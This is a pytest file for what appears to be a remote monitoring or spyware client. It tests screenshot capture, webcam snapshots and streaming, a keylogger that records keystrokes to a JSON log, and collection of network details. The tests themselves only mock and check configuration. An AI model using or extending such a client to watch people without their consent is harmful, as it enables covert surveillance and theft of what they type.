"""
Tests for Screenshot, Webcam, KeyLogger, and NetworkInfo features
"""

from pathlib import Path
from unittest.mock import patch, MagicMock, mock_open
from datetime import datetime
import pytest, sys, os, json, tempfile

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))

class TestScreenshot:
    """Tests for Screenshot class"""
    
    def test_screenshot_init(self, temp_dir):
        """Test Screenshot initialization"""
        from __app__.client_app.features.screenshot.main import Screenshot
        
        screenshot = Screenshot(
            output_dir=temp_dir,
            interval=30,
            quality=90
        )
        
        assert screenshot.interval == 30
        assert screenshot.quality == 90
        assert screenshot.running is False
    
    def test_screenshot_init_creates_directory(self, temp_dir):
        """Test Screenshot creates output directory"""
        from __app__.client_app.features.screenshot.main import Screenshot
        
        output_dir = os.path.join(temp_dir, "screenshots")
        Screenshot(output_dir=output_dir)
        
        assert os.path.exists(output_dir)
    
    def test_screenshot_init_creates_metadata_file(self, temp_dir):
        """Test Screenshot creates metadata file"""
        from __app__.client_app.features.screenshot.main import Screenshot
        
        Screenshot(output_dir=temp_dir)
        
        metadata_file = os.path.join(temp_dir, "metadata.json")
        assert os.path.exists(metadata_file)
    
    def test_screenshot_change_detection_disabled(self, temp_dir):
        """Test Screenshot with change detection disabled"""
        from __app__.client_app.features.screenshot.main import Screenshot
        
        screenshot = Screenshot(
            output_dir=temp_dir,
            change_detection=False
        )
        
        assert screenshot.change_detection is False
    
    def test_screenshot_change_detection_enabled(self, temp_dir):
        """Test Screenshot with change detection enabled"""
        from __app__.client_app.features.screenshot.main import Screenshot
        
        screenshot = Screenshot(
            output_dir=temp_dir,
            change_detection=True,
            change_threshold=10.0
        )
        
        assert screenshot.change_detection is True
        assert screenshot.change_threshold == 10.0
    
    def test_screenshot_capture_area(self, temp_dir):
        """Test Screenshot with capture area"""
        from __app__.client_app.features.screenshot.main import Screenshot
        
        screenshot = Screenshot(
            output_dir=temp_dir,
            capture_area=(0, 0, 800, 600)
        )
        
        assert screenshot.capture_area == (0, 0, 800, 600)
    
    def test_screenshot_start_stop(self, temp_dir):
        """Test Screenshot start and stop"""
        from __app__.client_app.features.screenshot.main import Screenshot
        
        screenshot = Screenshot(output_dir=temp_dir)
        
        with patch.object(screenshot, '_capture_loop'):
            screenshot.start()
            assert screenshot.running is True
            
            screenshot.stop()
            assert screenshot.running is False
    
    @patch('PIL.ImageGrab.grab')
    def test_screenshot_capture_now(self, mock_grab, temp_dir):
        """Test immediate screenshot capture"""
        from __app__.client_app.features.screenshot.main import Screenshot
        
        mock_image = MagicMock()
        mock_image.width = 1920
        mock_image.height = 1080
        mock_grab.return_value = mock_image
        
        with patch('ctypes.windll') as mock_ctypes:
            mock_ctypes.user32.GetForegroundWindow.return_value = 0
            mock_ctypes.user32.GetWindowTextLengthW.return_value = 0
            
            screenshot = Screenshot(output_dir=temp_dir)
            result = screenshot.capture_now()
            
            mock_image.save.assert_called_once()

class TestWebcam:
    """Tests for Webcam snapshot class"""
    
    def test_webcam_init(self, temp_dir):
        """Test Webcam initialization"""
        from __app__.client_app.features.webcam_snapshot.main import Webcam
        
        webcam = Webcam(
            output_dir=temp_dir,
            interval=30,
            camera_index=0
        )
        
        assert webcam.interval == 30
        assert webcam.camera_index == 0
        assert webcam.running is False
    
    def test_webcam_motion_detection_disabled(self, temp_dir):
        """Test Webcam with motion detection disabled"""
        from __app__.client_app.features.webcam_snapshot.main import Webcam
        
        webcam = Webcam(
            output_dir=temp_dir,
            motion_detection=False
        )
        
        assert webcam.motion_detection is False
    
    def test_webcam_motion_detection_enabled(self, temp_dir):
        """Test Webcam with motion detection enabled"""
        from __app__.client_app.features.webcam_snapshot.main import Webcam
        
        webcam = Webcam(
            output_dir=temp_dir,
            motion_detection=True,
            motion_threshold=3000
        )
        
        assert webcam.motion_detection is True
        assert webcam.motion_threshold == 3000
    
    def test_webcam_creates_directory(self, temp_dir):
        """Test Webcam creates output directory"""
        from __app__.client_app.features.webcam_snapshot.main import Webcam
        
        output_dir = os.path.join(temp_dir, "snapshots")
        Webcam(output_dir=output_dir)
        
        assert os.path.exists(output_dir)
    
    def test_webcam_start_stop(self, temp_dir):
        """Test Webcam start and stop"""
        from __app__.client_app.features.webcam_snapshot.main import Webcam
        
        webcam = Webcam(output_dir=temp_dir)
        
        with patch.object(webcam, '_capture_loop'):
            webcam.start()
            assert webcam.running is True
            
            webcam.stop()
            assert webcam.running is False

class TestWebcamStream:
    """Tests for WebcamStream class"""
    
    def test_webcam_stream_init(self):
        """Test WebcamStream initialization"""
        from __app__.client_app.features.webcam_stream.main import WebcamStream
        
        stream = WebcamStream(
            camera_index=0,
            fps=15,
            resolution=(1280, 720),
            quality=80
        )
        
        assert stream.fps == 15
        assert stream.resolution == (1280, 720)
        assert stream.quality == 80
        assert stream.running is False
    
    def test_webcam_stream_motion_only(self):
        """Test WebcamStream with motion_only"""
        from __app__.client_app.features.webcam_stream.main import WebcamStream
        
        stream = WebcamStream(motion_only=True)
        
        assert stream.motion_only is True
    
    def test_webcam_stream_statistics_init(self):
        """Test WebcamStream initializes statistics"""
        from __app__.client_app.features.webcam_stream.main import WebcamStream
        
        stream = WebcamStream()
        
        assert stream.frames_sent == 0
        assert stream.bytes_sent == 0
    
    def test_webcam_stream_start_with_callback(self):
        """Test WebcamStream start with callback"""
        from __app__.client_app.features.webcam_stream.main import WebcamStream
        
        callback = MagicMock()
        stream = WebcamStream()
        
        with patch.object(stream, '_capture_and_send_loop'):
            stream.start(frame_callback=callback)
            
            assert stream.frame_callback == callback
            assert stream.running is True
            
            stream.stop()
    
    def test_webcam_stream_adjust_quality(self):
        """Test WebcamStream quality adjustment"""
        from __app__.client_app.features.webcam_stream.main import WebcamStream
        
        stream = WebcamStream(quality=50)
        
        stream.adjust_quality(80)
        assert stream.quality == 80
        
        stream.adjust_quality(150)
        assert stream.quality == 100
        
        stream.adjust_quality(-10)
        assert stream.quality == 1
    
    def test_webcam_stream_adjust_fps(self):
        """Test WebcamStream FPS adjustment"""
        from __app__.client_app.features.webcam_stream.main import WebcamStream
        
        stream = WebcamStream(fps=10)
        
        stream.adjust_fps(20)
        assert stream.fps == 20
        
        stream.adjust_fps(60)
        assert stream.fps == 30
        
        stream.adjust_fps(0)
        assert stream.fps == 1

class TestKeyLogger:
    """Tests for KeyLogger class"""
    
    def test_keylogger_init(self, temp_dir):
        """Test KeyLogger initialization"""
        from __app__.client_app.features.keyLogger.main import KeyLogger
        
        log_file = os.path.join(temp_dir, "keylog.json")
        keylogger = KeyLogger(
            log_file=log_file,
            inactivity_timeout=10
        )
        
        assert keylogger.inactivity_timeout == 10
        assert keylogger.current_text == ""
    
    def test_keylogger_creates_log_file(self, temp_dir):
        """Test KeyLogger creates log file"""
        from __app__.client_app.features.keyLogger.main import KeyLogger
        
        log_file = os.path.join(temp_dir, "keylog.json")
        KeyLogger(log_file=log_file)
        
        assert os.path.exists(log_file)
        
        with open(log_file, 'r') as f:
            content = json.load(f)
            assert content == []
    
    def test_keylogger_creates_parent_directories(self, temp_dir):
        """Test KeyLogger creates parent directories"""
        from __app__.client_app.features.keyLogger.main import KeyLogger
        
        log_file = os.path.join(temp_dir, "logs", "keys", "keylog.json")
        KeyLogger(log_file=log_file)
        
        assert os.path.exists(log_file)
    
    def test_keylogger_on_press_regular_key(self, temp_dir):
        """Test KeyLogger on_press with regular key"""
        from __app__.client_app.features.keyLogger.main import KeyLogger
        
        log_file = os.path.join(temp_dir, "keylog.json")
        keylogger = KeyLogger(log_file=log_file)
        
        mock_key = MagicMock()
        mock_key.char = 'a'
        
        with patch('ctypes.windll'):
            keylogger.on_press(mock_key)
            
            assert keylogger.current_text == 'a'
    
    def test_keylogger_on_press_accumulates(self, temp_dir):
        """Test KeyLogger accumulates keypresses"""
        from __app__.client_app.features.keyLogger.main import KeyLogger
        
        log_file = os.path.join(temp_dir, "keylog.json")
        keylogger = KeyLogger(log_file=log_file)
        
        with patch('ctypes.windll'):
            for char in ['h', 'e', 'l', 'l', 'o']:
                mock_key = MagicMock()
                mock_key.char = char
                keylogger.on_press(mock_key)
            
            assert keylogger.current_text == 'hello'
    
    def test_keylogger_start_stop(self, temp_dir):
        """Test KeyLogger start and stop"""
        from __app__.client_app.features.keyLogger.main import KeyLogger
        
        log_file = os.path.join(temp_dir, "keylog.json")
        keylogger = KeyLogger(log_file=log_file)
        
        with patch('pynput.keyboard.Listener') as mock_listener:
            mock_instance = MagicMock()
            mock_listener.return_value = mock_instance
            keylogger.listener = mock_instance
            keylogger.stop()
            
            mock_instance.stop.assert_called_once()

class TestNetworkInfo:
    """Tests for NetworkInfo class"""
    
    def test_network_info_init(self, temp_dir):
        """Test NetworkInfo initialization"""
        from __app__.client_app.features.networkInfo.main import NetworkInfo
        
        output_file = os.path.join(temp_dir, "network.json")
        network = NetworkInfo(
            output_file=output_file,
            interval=60,
            track_changes=True
        )
        
        assert network.interval == 60
        assert network.track_changes is True
        assert network.running is False
    
    def test_network_info_creates_file(self, temp_dir):
        """Test NetworkInfo creates output file"""
        from __app__.client_app.features.networkInfo.main import NetworkInfo
        
        output_file = os.path.join(temp_dir, "network.json")
        NetworkInfo(output_file=output_file)
        
        assert os.path.exists(output_file)
    
    def test_network_info_get_hostname(self, temp_dir):
        """Test NetworkInfo hostname retrieval"""
        from __app__.client_app.features.networkInfo.main import NetworkInfo
        
        output_file = os.path.join(temp_dir, "network.json")
        network = NetworkInfo(output_file=output_file)
        
        hostname = network._get_hostname()
        
        assert isinstance(hostname, str)
        assert len(hostname) > 0
    
    def test_network_info_get_local_ip(self, temp_dir):
        """Test NetworkInfo local IP retrieval"""
        from __app__.client_app.features.networkInfo.main import NetworkInfo
        
        with patch('socket.socket') as mock_socket:
            mock_sock = MagicMock()
            mock_sock.getsockname.return_value = ('192.168.1.100', 12345)
            mock_socket.return_value.__enter__ = MagicMock(return_value=mock_sock)
            mock_socket.return_value.__exit__ = MagicMock(return_value=False)
            mock_socket.return_value = mock_sock
            
            output_file = os.path.join(temp_dir, "network.json")
            network = NetworkInfo(output_file=output_file)
            
            local_ip = network._get_local_ip()
            
            assert local_ip == '192.168.1.100'
    
    def test_network_info_get_public_ip(self, temp_dir):
        """Test NetworkInfo public IP retrieval"""
        from __app__.client_app.features.networkInfo.main import NetworkInfo
        
        with patch('requests.get') as mock_get:
            mock_response = MagicMock()
            mock_response.json.return_value = {'ip': '8.8.8.8'}
            mock_get.return_value = mock_response
            
            output_file = os.path.join(temp_dir, "network.json")
            network = NetworkInfo(output_file=output_file)
            
            public_ip = network._get_public_ip()
            
            assert public_ip == '8.8.8.8'
    
    def test_network_info_get_current_info(self, temp_dir):
        """Test NetworkInfo get_current_info returns dict"""
        from __app__.client_app.features.networkInfo.main import NetworkInfo
        
        output_file = os.path.join(temp_dir, "network.json")
        network = NetworkInfo(output_file=output_file)
        
        with patch.object(network, '_get_local_ip', return_value='192.168.1.1'), \
             patch.object(network, '_get_public_ip', return_value='8.8.8.8'), \
             patch.object(network, '_get_hostname', return_value='test-pc'), \
             patch.object(network, '_get_mac_address', return_value='00:11:22:33:44:55'), \
             patch.object(network, '_get_gateway', return_value='192.168.1.1'), \
             patch.object(network, '_get_dns_servers', return_value=['8.8.8.8']), \
             patch.object(network, '_get_network_interfaces', return_value=[]):
            
            info = network.get_current_info()
            
            assert isinstance(info, dict)
            assert 'timestamp' in info
            assert 'hostname' in info
            assert 'local_ip' in info
            assert 'public_ip' in info
    
    def test_network_info_start_stop(self, temp_dir):
        """Test NetworkInfo start and stop"""
        from __app__.client_app.features.networkInfo.main import NetworkInfo
        
        output_file = os.path.join(temp_dir, "network.json")
        network = NetworkInfo(output_file=output_file)
        
        with patch.object(network, '_monitor_loop'):
            network.start()
            assert network.running is True
            
            network.stop()
            assert network.running is False
    
    def test_network_info_has_changed_first_check(self, temp_dir):
        """Test NetworkInfo _has_changed returns True on first check"""
        from __app__.client_app.features.networkInfo.main import NetworkInfo
        
        output_file = os.path.join(temp_dir, "network.json")
        network = NetworkInfo(output_file=output_file)
        
        config = {'local_ip': '192.168.1.1'}
        
        assert network._has_changed(config) is True
    
    def test_network_info_has_changed_same_config(self, temp_dir):
        """Test NetworkInfo _has_changed returns False for same config"""
        from __app__.client_app.features.networkInfo.main import NetworkInfo
        
        output_file = os.path.join(temp_dir, "network.json")
        network = NetworkInfo(output_file=output_file)
        
        config = {
            'local_ip': '192.168.1.1',
            'public_ip': '8.8.8.8',
            'default_gateway': '192.168.1.1',
            'dns_servers': ['8.8.8.8']
        }
        
        network.previous_config = config.copy()
        
        assert network._has_changed(config) is False
    
    def test_network_info_has_changed_different_ip(self, temp_dir):
        """Test NetworkInfo _has_changed detects IP change"""
        from __app__.client_app.features.networkInfo.main import NetworkInfo
        
        output_file = os.path.join(temp_dir, "network.json")
        network = NetworkInfo(output_file=output_file)
        
        network.previous_config = {
            'local_ip': '192.168.1.1',
            'public_ip': '8.8.8.8',
            'default_gateway': '192.168.1.1',
            'dns_servers': ['8.8.8.8']
        }
        
        new_config = {
            'local_ip': '192.168.1.100',
            'public_ip': '8.8.8.8',
            'default_gateway': '192.168.1.1',
            'dns_servers': ['8.8.8.8']
        }
        
        assert network._has_changed(new_config) is True
